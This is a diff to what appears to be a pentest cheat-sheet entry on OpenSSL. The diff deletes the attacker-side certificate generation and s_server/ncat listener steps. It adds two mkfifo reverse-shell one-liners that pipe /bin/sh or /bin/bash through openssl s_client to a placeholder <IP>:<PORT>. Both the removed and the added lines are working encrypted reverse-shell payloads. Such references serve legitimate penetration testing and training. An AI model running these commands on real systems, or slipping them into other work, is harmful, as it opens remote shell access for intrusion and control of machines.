@@ -1,27 +1,9 @@
 # OpenSSL
 
-## 01 - Attacker
-
-- Generate TLS certificate
-
 ```
-user@pentestos:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-```
+$ mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/f; rm /tmp/f
 
-- Shell handler
-
-```
-user@pentestos:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
-
-user@pentestos:~$ ncat --ssl [--ssl-key key.pem --ssl-cert cert.pem] -lp <PORT>
-```
-
-## 02 - Target
-
-- Execute shell one-liner
-
-```
-$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
+$ mkfifo /tmp/f; /bin/bash -i < /tmp/f 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/f; rm /tmp/f
 ```
 
 ---
